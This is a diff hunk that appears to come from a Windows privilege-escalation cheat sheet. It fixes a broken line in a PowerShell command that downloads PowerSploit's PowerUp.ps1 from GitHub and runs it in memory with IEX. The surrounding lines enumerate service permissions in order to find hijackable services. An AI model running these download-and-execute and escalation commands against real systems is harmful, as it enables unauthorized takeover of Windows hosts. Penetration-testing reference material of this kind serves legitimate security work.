@@ -627,8 +627,7 @@ accesschk64.exe -accepteula -uwcqv <SERVICE_NAME>
 # (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
 # Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
 # Get-ModifiableService - returns services the current user can reconfigure
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
 PS> Get-ModifiableServiceFile
 PS> Get-ModifiableService
 
